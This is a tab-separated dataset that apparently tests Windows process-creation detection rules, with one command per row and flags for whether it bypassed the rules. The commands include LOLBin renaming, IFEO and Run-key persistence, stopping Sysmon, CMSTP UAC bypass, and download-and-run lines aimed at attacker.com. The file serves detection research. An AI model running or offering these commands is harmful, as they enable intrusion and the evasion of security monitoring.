Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
unknown	proc_creation_win_bginfo_suspicious_child_process				copy rundll32.exe rundll32_alt.exe && bginfo.exe C:\path\to\config.bgi /popup /nolicprompt	FALSE	FALSE	FALSE	
unknown	proc_creation_win_bginfo_uncommon_child_process				copy Bginfo.exe bg_update.exe && bg_update.exe C:\Windows\Temp\config.bgi /popup /nolicprompt	FALSE	FALSE	FALSE	
unknown	proc_creation_win_bginfo_uncommon_child_process				Bginfo64.exe /popup /i:config.bgi /timer:0	FALSE	FALSE	FALSE	
unknown	proc_creation_win_bginfo_uncommon_child_process				copy calc.exe bginfo.exe && bginfo.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_bginfo_uncommon_child_process				"reg add ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\bginfo.exe"" /v Debugger /t REG_SZ /d ""malware.exe"""	TRUE	TRUE	TRUE	
unknown	proc_creation_win_clip_execution				"powershell.exe -Command ""Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::SetText((Get-Content secret.txt))"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_cmstp_execution_by_creation				cmstp.exe /s /ni /au C:\Users\Public\payload.inf & start /b calc.exe	TRUE	TRUE	FALSE	Bypass UAC via CMSTP (e66779cc-383e-4224-a3a4-267eeb585c40)
unknown	proc_creation_win_cmstp_execution_by_creation				cmstp.exe /s C:\Users\Public\remote_access.inf	TRUE	TRUE	FALSE	Bypass UAC via CMSTP (e66779cc-383e-4224-a3a4-267eeb585c40)
unknown	proc_creation_win_csc_susp_parent				"cmd.exe /c ""csc.exe /target:exe /out:payload.exe payload.cs"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_csc_susp_parent				copy csc.exe not_csc.exe && not_csc.exe /target:library /out:exploit.dll exploit.cs	FALSE	FALSE	FALSE	
unknown	proc_creation_win_csc_susp_parent				"powershell.exe -ExecutionPolicy Bypass -Command ""& { $code = '[DllImport(\""user32.dll\"")] public static extern int MessageBox(int h, string m, string c, int type);'; csc.exe /target:library /out:test.dll test.cs }"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_csi_execution				copy csi.exe not_csi.exe && not_csi.exe script.csx	FALSE	FALSE	FALSE	
unknown	proc_creation_win_csi_execution				csi.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_csi_use_of_csharp_console				copy csi.exe not_csi.exe && cmd.exe /c not_csi.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_csi_use_of_csharp_console				"wmic process call create ""csi.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_defaultpack_uncommon_child_process				"copy DefaultPack.exe NotDefault.exe && NotDefault.exe /P ""cmd.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_defaultpack_uncommon_child_process				"DefaultPack.exe /P ""powershell.exe -Command Start-Job -ScriptBlock { Start-Process calc.exe }"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_diskshadow_child_process_susp				copy powershell.exe not_ps.exe && diskshadow.exe /s C:\path\to\script_calling_not_ps.txt	FALSE	FALSE	FALSE	
unknown	proc_creation_win_diskshadow_child_process_susp				diskshadow.exe /s C:\path\to\script.txt	FALSE	FALSE	FALSE	
unknown	proc_creation_win_dns_susp_child_process				"copy powershell.exe not_powershell.exe && not_powershell.exe -Command ""whoami"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_dns_susp_child_process				"powershell.exe -Command ""whoami"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_dns_susp_child_process				"pwsh.exe -Command ""whoami"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_dnx_execute_csharp_code				copy dnx.exe not_dnx.exe && not_dnx.exe .	FALSE	FALSE	FALSE	
unknown	proc_creation_win_fltmc_unload_driver_sysmon				copy fltmc.exe not_fltmc.exe && not_fltmc.exe unload SYSMONDRV	FALSE	FALSE	FALSE	
unknown	proc_creation_win_fltmc_unload_driver_sysmon				fltmc.exe unload	TRUE	TRUE	TRUE	
unknown	proc_creation_win_fltmc_unload_driver_sysmon				sc.exe stop Sysmon	TRUE	TRUE	FALSE	Suspicious Windows Service Tampering (ce72ef99-22f1-43d4-8695-419dcb5d9330); Stop Windows Service Via Sc.EXE (81bcb81b-5b1f-474b-b373-52c871aaa7b1)
unknown	proc_creation_win_gpg4win_portable_execution				backup_tool.exe --symmetric data.txt	FALSE	FALSE	FALSE	
unknown	proc_creation_win_gpg4win_portable_execution				"mkdir ""C:\Program Files (x86)\GnuPG\bin"" && copy portable_crypto.exe ""gpg.exe"" && ""gpg.exe"" --symmetric --cipher-algo AES256 data.txt"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hh_html_help_susp_child_process				copy powershell.exe not_suspicious.exe && hh.exe C:\path\to\exploit.chm	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hh_html_help_susp_child_process				hh.exe C:\path\to\malicious.chm	TRUE	TRUE	FALSE	HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
unknown	proc_creation_win_hh_html_help_susp_child_process				"hh.exe javascript:eval(""new ActiveXObject('WScript.Shell').Run('calc.exe')"")"	TRUE	TRUE	FALSE	Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee)
unknown	proc_creation_win_hh_html_help_susp_child_process				hh.exe -decompile C:\temp\output C:\path\to\malicious.chm	TRUE	TRUE	FALSE	HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
unknown	proc_creation_win_hh_html_help_susp_child_process				hh.exe C:\path\to\exploit.chm	TRUE	TRUE	FALSE	HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
unknown	proc_creation_win_hh_html_help_susp_child_process				"hh.exe javascript:eval('new ActiveXObject(""WScript.Shell"").Run(""calc.exe"")')"	TRUE	TRUE	FALSE	Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee)
unknown	proc_creation_win_hh_html_help_susp_child_process				"bash.exe -c ""curl http://attacker.com/payload.sh | sh"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hh_html_help_susp_child_process				C:\Temp\ enamed\_cmd.exe /c whoami	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hh_html_help_susp_child_process				"explorer.exe C:\path\	o\malicious\_payload.exe"	TRUE	TRUE	TRUE	
unknown	proc_creation_win_hktl_execution_via_imphashes				Invoke-ReflectivePEInjection -PEPath JuicyPotato.exe -ProcName explorer	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hktl_execution_via_imphashes				"python3 -c ""import pefile; pe = pefile.PE('PetitPotam.exe'); pe.OPTIONAL_HEADER.AddressOfEntryPoint += 0; pe.write('PetitPotam_modified.exe')"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hktl_trufflesnout				AD_Auditor.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_hktl_trufflesnout				execute-assembly /opt/TruffleSnout.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_jsc_execution				copy jsc.exe not_jsc.exe && not_jsc.exe /out:payload.exe script.js	FALSE	FALSE	FALSE	
unknown	proc_creation_win_lolbin_pcwrun				copy pcwrun.exe not_pcw.exe && not_pcw.exe calc.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_lolbin_pcwrun				"pcwrun.exe ""calc.exe"""	TRUE	TRUE	FALSE	Indirect Command Execution By Program Compatibility Wizard (b97cd4b1-30b8-4a9d-bd72-6293928d52bc)
unknown	proc_creation_win_lolbin_runexehelper				ren runexehelper.exe legit_tool.exe && legit_tool.exe some_payload.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_lolbin_runexehelper				runexehelper.exe . . . && copy calc.exe not_calc.exe && not_calc.exe	TRUE	TRUE	TRUE	
unknown	proc_creation_win_lolbin_ttdinject				copy TTDInject.exe NotMalicious.exe && NotMalicious.exe /ttd 1234 /out C:\Logs	FALSE	FALSE	FALSE	
unknown	proc_creation_win_lolbin_wfc				copy wfc.exe not_suspicious.exe && not_suspicious.exe /target:library /out:payload.dll workflow.xoml	FALSE	FALSE	FALSE	
unknown	proc_creation_win_lolbin_wfc				"powershell -Command ""[System.Reflection.Assembly]::LoadFile('wfc.exe').EntryPoint.Invoke($null, @(,[string[]]('/target:library', '/out:payload.dll', 'workflow.xoml')))"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_msdt_susp_parent				copy msdt.exe not_msdt.exe && not_msdt.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_msdt_susp_parent				"Start-ScheduledTask -TaskName ""LegitTask"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_msdt_susp_parent				svchost.exe	TRUE	TRUE	FALSE	Suspect Svchost Activity (16c37b52-b141-42a5-a3ea-bbe098444397); Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
unknown	proc_creation_win_mshta_lethalhta_technique				mshta.exe javascript:a=(new ActiveXObject('WScript.Shell')).Run('calc.exe');close();	FALSE	FALSE	FALSE	
unknown	proc_creation_win_mshta_susp_child_processes				"copy cmd.exe not_cmd.exe && mshta.exe javascript:a=new ActiveXObject(""WScript.Shell"");a.Run(""not_cmd.exe"");window.close()"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_mshta_susp_child_processes				mshta.exe C:\path\to\malicious.hta	TRUE	TRUE	TRUE	
unknown	proc_creation_win_mshta_susp_child_processes				"mshta.exe javascript:a=new ActiveXObject(""WScript.Shell"");a.Run(""rundll32.exe shell32.dll,Control_RunDLL"",1,true);window.close()"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_mssql_sqlps_susp_execution				"copy powershell.exe sqlps.exe && sqlps.exe -Command ""Write-Host 'Bypassed'"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_mssql_sqlps_susp_execution				"New-Item -Path ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sqlps.exe"" -Force; New-ItemProperty -Path ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sqlps.exe"" -Name ""Debugger"" -Value ""cmd.exe /c echo bypass"" -PropertyType ""String"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_mssql_sqlps_susp_execution				"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Import-Module sqlps; Get-Service"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_mssql_sqltoolsps_susp_execution				"copy powershell.exe not_sqltools.exe && not_sqltools.exe -Command ""Write-Host 'Malicious Payload Here'"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_mssql_sqltoolsps_susp_execution				"smss.exe -ExecutionParam ""sqltoolsps.exe -Command 'Invoke-WebRequest http://attacker.com/shell.ps1'"""	TRUE	TRUE	FALSE	Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
unknown	proc_creation_win_msxsl_execution				copy msxsl.exe not_suspicious.exe && not_suspicious.exe customer.xml style.xsl	FALSE	FALSE	FALSE	
unknown	proc_creation_win_msxsl_execution				ren msxsl.exe m.exe && m.exe script.xml transform.xsl	FALSE	FALSE	FALSE	
unknown	proc_creation_win_odbcconf_response_file_susp				"odbcconf.exe /a {REGSVR ""C:	emp\payload.dll""}"	TRUE	TRUE	FALSE	New DLL Registered Via Odbcconf.EXE (9f0a8bf3-a65b-440a-8c1e-5cb1547c8e70)
unknown	proc_creation_win_odbcconf_response_file_susp				"odbcconf.exe /F ""C:	emp\payload.rsp"""	TRUE	TRUE	FALSE	Response File Execution Via Odbcconf.EXE (5f03babb-12db-4eec-8c82-7b4cb5580868)
unknown	proc_creation_win_odbcconf_response_file_susp				"odbcconf.exe /F""C:	emp\payload.txt"""	TRUE	TRUE	TRUE	
unknown	proc_creation_win_office_outlook_susp_child_processes				curl.exe -o payload.exe http://attacker.com/payload.exe && payload.exe	TRUE	TRUE	TRUE	
unknown	proc_creation_win_office_outlook_susp_child_processes				"powershell.exe -Command ""Start-Process notepad.exe"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_office_outlook_susp_child_processes				rundll32.exe malicious.dll,EntryPoint	TRUE	TRUE	TRUE	
unknown	proc_creation_win_office_susp_child_processes				copy cmd.exe not_suspicious.exe && not_suspicious.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_office_susp_child_processes				"powershell -Command ""Start-Job -ScriptBlock { Start-Process 'cmd.exe' }"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_office_susp_child_processes				"Schtasks /Create /SC ONCE /TN ""Update"" /TR ""cmd.exe"" /ST 12:00 && Schtasks /Run /TN ""Update"""	TRUE	TRUE	FALSE	Suspicious Schtasks Schedule Types (24c8392b-aa3c-46b7-a545-43f71657fe98); Scheduled Task Creation Via Schtasks.EXE (92626ddd-662c-49e3-ac59-f6535f12d189)
unknown	proc_creation_win_office_susp_child_processes				"wmic process call create ""calc.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_pressanykey_lolbin_execution				"copy ""Microsoft.NodejsTools.PressAnyKey.exe"" ""renamed_tool.exe"" && ""renamed_tool.exe"" cmd.exe"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_provlaunch_potential_abuse				copy provlaunch.exe system_update.exe && system_update.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_provlaunch_potential_abuse				"reg add HKLM\SOFTWARE\Microsoft\Provisioning\OMADM\Accounts\TestBypass /v OEMExtensionExecutable /t REG_SZ /d ""payload.exe"" /f && provlaunch.exe"	TRUE	TRUE	TRUE	
unknown	proc_creation_win_provlaunch_potential_abuse				"reg add HKLM\SOFTWARE\Microsoft\Provisioning\OMADM\Accounts\TestBypass /v OEMExtensionExecutable /t REG_SZ /d ""rundll32.exe Malicious.dll,EntryPoint"" /f && provlaunch.exe"	TRUE	TRUE	TRUE	
unknown	proc_creation_win_provlaunch_susp_child_process				"Child Process: wmic.exe process call create ""payload.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_quickassist_execution				copy QuickAssist.exe SupportTool.exe && SupportTool.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_reg_direct_asep_registry_keys_modification				"powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateTask' -Value 'payload.exe'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_reg_direct_asep_registry_keys_modification				regedit.exe /s C:\Windows\Temp\persistence.reg	TRUE	TRUE	FALSE	Imports Registry Key From a File (73bba97f-a82d-42ce-b315-9182e76c57b1)
unknown	proc_creation_win_reg_direct_asep_registry_keys_modification				"wmic /NAMESPACE:\\root\default Class StdRegProv Call SetStringValue hDefKey=""&H80000001"" sSubKeyName=""Software\Microsoft\Windows\CurrentVersion\Run"" sValueName=""UpdateTask"" sValue=""payload.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_anydesk_susp_exec				copy AnyDesk.exe Update.exe && ResourceHacker.exe -open Update.exe -save Update.exe -action delete -mask versioninfo,, && Update.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_anydesk_susp_exec				mkdir C:\Temp\AppData\ && copy AnyDesk.exe AnyDesk.exe && AnyDesk.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_gotoopener				rcedit.exe GoToOpener.exe --set-version-string CompanyName Unknown && GoToOpener.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_logmein				Start-Process .\modified_LMIGuardianSvc.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_meshagent_exec				"mshta.exe vbscript:Close(Execute(""CreateObject(""""WScript.Shell"""").Run """"powershell.exe -nop -ep bypass""""""))"	TRUE	TRUE	FALSE	MSHTA Execution with Suspicious File Extensions (cc7abbd0-762b-41e3-8a26-57ad50d2eea3); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee); Wscript Shell Run In CommandLine (2c28c248-7f50-417a-9186-a85b223010ee)
unknown	proc_creation_win_remote_access_tools_meshagent_exec				renamed_cmd.exe /c ipconfig	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_meshagent_exec				"wmic.exe process call create ""cmd.exe /c whoami"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_netsupport				update_service.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_screenconnect				"copy cmd.exe ScreenConnect.exe && ScreenConnect.exe /c ""whoami"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_screenconnect				"powershell.exe -ExecutionPolicy Bypass -Command ""& { [Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('ScreenConnect.dll')); [ScreenConnect.Program]::Main(@()) }"""	TRUE	TRUE	FALSE	Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp				certutil.exe -urlcache -f http://example.com/payload.exe payload.exe	TRUE	TRUE	FALSE	Suspicious Download Via Certutil.EXE (19b08b1c-861d-4e75-a1ef-ea0c1baf202b)
unknown	proc_creation_win_remote_access_tools_screenconnect_webshell				"powershell.exe -c ""Copy-Item cmd.exe -Destination update.exe; update.exe /c whoami"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_remote_access_tools_screenconnect_webshell				"powershell.exe -NoProfile -Command ""Get-Date"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_remote_access_tools_screenconnect_webshell				wscript.exe malicious.vbs	TRUE	TRUE	TRUE	
unknown	proc_creation_win_remote_access_tools_simple_help				"copy ""SimpleService.exe"" ""not_simple.exe"" && ""not_simple.exe"""	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_simple_help				"reg add ""HKLM\System\CurrentControlSet\Services\NotSimple"" /v ImagePath /t REG_EXPAND_SZ /d ""Svc.exe"" /f"	TRUE	TRUE	FALSE	Potential Persistence Attempt Via Existing Service Tampering (38879043-7e1e-47a9-8d46-6bec88e201df); Potential Persistence Attempt Via Existing Service Tampering (38879043-7e1e-47a9-8d46-6bec88e201df)
unknown	proc_creation_win_remote_access_tools_ultraviewer				copy C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe not_ultra.exe && not_ultra.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_remote_access_tools_ultraviewer				"powershell -Command ""Start-Process -FilePath 'UltraViewer_Desktop.exe' -WindowStyle Hidden"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_renamed_curl				ResourceHacker.exe -open curl.exe -save svchost.exe -action modify -res version.res -mask VERSIONINFO,1,1033	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_dctask64				dctask64.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_dctask64				svchost.exe	TRUE	TRUE	FALSE	Suspect Svchost Activity (16c37b52-b141-42a5-a3ea-bbe098444397); Uncommon Svchost Parent Process (01d2e2a1-5f09-44f7-9fc1-24faa7479b6d)
unknown	proc_creation_win_renamed_ftp				"powershell.exe -Command ""$bytes = [IO.File]::ReadAllBytes('ftp.exe'); $target = [System.Text.Encoding]::Unicode.GetBytes('ftp.exe'); $replacement = [System.Text.Encoding]::Unicode.GetBytes('mod.exe'); for ($i = 0; $i -lt $bytes.Length - $target.Length; $i++) { $match = $true; for ($j = 0; $j -lt $target.Length; $j++) { if ($bytes[$i+$j] -ne $target[$j]) { $match = $false; break } } if ($match) { for ($j = 0; $j -lt $replacement.Length; $j++) { $bytes[$i+$j] = $replacement[$j] } } }; [IO.File]::WriteAllBytes('svchost.exe', $bytes); Start-Process 'svchost.exe'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
unknown	proc_creation_win_renamed_gpg4win				"rcedit.exe payload.exe --set-version-string ""OriginalFilename"" ""updater.exe"" && payload.exe --symmetric sensitive_data.txt"	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_megasync				copy megasync.exe megasync.exe && megasync.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_megasync				ResourceHacker.exe -open megasync.exe -save svchost.exe -action modify -res custom_version.res -mask VERSIONINFO,1,1033 && svchost.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_nircmd				rh.exe -open nircmd.exe -save fake_svchost.exe -action delete -mask VERSIONINFO,1,1033 && fake_svchost.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_paexec				PAExec-UpdateTask.exe \\192.168.1.50 -s powershell.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_paexec				paexec.exe \\192.168.1.50 -u Administrator -p Password123 cmd.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_renamed_pressanykey				Microsoft.NodejsTools.PressAnyKey.exe calc.exe	FALSE	FALSE	FALSE	
unknown	proc_creation_win_rundll32_setupapi_installhinfsection				copy setupapi.dll alt_api.dll && rundll32.exe alt_api.dll,InstallHinfSection DefaultInstall 128 C:\temp\payload.inf	FALSE	FALSE	FALSE	
